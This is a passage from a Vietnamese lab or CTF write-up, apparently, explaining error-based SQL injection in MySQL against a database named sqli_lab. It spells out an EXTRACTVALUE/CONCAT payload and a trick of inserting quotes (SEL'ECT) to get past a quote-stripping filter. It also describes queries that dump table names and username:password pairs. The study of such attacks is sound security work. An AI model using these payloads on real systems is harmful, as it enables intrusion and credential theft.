password= || EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))#
```
Từng thành phần

`||`
Trong MySQL, đây là toán tử OR (tương tự OR).
`Ví dụ: 1 || 0 = 1`
Payload dùng || để nối thêm điều kiện luôn true hoặc ép chạy thêm biểu thức.

`EXTRACTVALUE(1, CONCAT(...))`
Đây là XML function trong MySQL (từ bản 5.x).

`EXTRACTVALUE(xml_document, xpath_string)`
Nó parse XML → nhưng nếu xpath_string chứa ký tự đặc biệt hoặc chuỗi dài, MySQL sẽ trả về error có chứa chuỗi đó.
=> Đây là trick để in ra dữ liệu (error-based SQLi).

`CONCAT(0x7e, DATABASE(), 0x7e)`
0x7e = ký tự ~
DATABASE() = tên database hiện tại
CONCAT(0x7e, DATABASE(), 0x7e) = ghép chuỗi

![image](https://hackmd.io/_uploads/BJLgQuNKlx.png)

Ở đây có thể thấy error trả về cho ta được tên bảng nhưng có vẻ hướng đi này vẫn đang rơi vào ngõ cụt vì sử dụng những hàm như này không có select sẽ không thể dump ra được thông tin của bảng khác hoặc thông tin trong bảng. Nhưng liệu SELECT có thực sự bị chặn? Sau khi đọc kỹ lại phần code thì ta để ý lại đoạn:

```sql    
 username = username.replace("\"", "").replace("'", "");
 password = password.replace("\"", "").replace("'", "");
```

Nó sẽ chỉ replace dấu `''` cùng với dấu `""` để nó biến thành mỗi whitespace vậy nên ta có thể lợi dụng nó bằng cách viết kiểu `SEL'ECT` điều này sẽ vừa giúp ta tránh được filter mà khi cái dấu biến mất nó sẽ được parse thành một chữ `SELECT` hoàn chỉnh tương tự với các chữ khác bị filter ta vẫn có thể làm được. Vậy giờ ta sẽ lợi dụng Error Based bằng cách dùng `EXTRACTVALUE` với `SELECT` để nó error ra các thông tin trong bảng.
Từ bước ở trên ta đã tìm được tên của Database ta sẽ dùng nó để đọc thông tin tiếp theo.

![image](https://hackmd.io/_uploads/rk08WoItle.png)

Thành công dump ra được danh sách bảng có trong database sqli_lab.
- `extractvalue(1, ...)`: Trích xuất dữ liệu từ một kết quả SQL.
- `concat(0x7e, ...)`: Nối ký tự ~ (tương đương với 0x7e) vào trước và sau kết quả.
- `select group_concat(table_name)`: Lấy tất cả tên bảng trong cơ sở dữ liệu sqli_lab và nối chúng lại thành một chuỗi.
- `from information_schema.tables where table_schema='sqli_lab'`: Truy vấn bảng hệ thống information_schema.tables để lấy tên bảng trong cơ sở dữ liệu sqli_lab.

Ở đây có thể thấy trong database có 2 bảng là users với posts. Bây giờ ta thử đọc username password 1 user trong bảng users.

![image](https://hackmd.io/_uploads/BJ7vVi8Fxx.png)

- `extractvalue(1, ...)`: Trích xuất giá trị từ câu truy vấn SQL được thực thi, có thể giúp hiển thị kết quả dưới dạng XML hoặc dữ liệu.
- `concat(0x7e, ...)`: Nối ký tự ~ (tương đương với 0x7e) vào trước và sau kết quả, giúp dễ phân biệt dữ liệu trả về.
- `select group_concat(username, 0x3a, password separator 0x2c)`:
- Trích xuất các cặp username:password từ bảng users.
- `0x3a` là mã hex cho dấu : (dùng để phân tách tên người dùng và mật khẩu).
- `separator 0x2c` sẽ phân tách các cặp username:password bằng dấu phẩy (,) giữa mỗi cặp.
- `from users`: Truy vấn từ bảng users chứa thông tin về tài khoản.
- 
Vậy là ta đã thành công dump thông tin dựa vào cách lợi dụng lớp phòng thủ tưởng chừng như an toàn trước attacker kết hợp với đó là Error Based sqli.


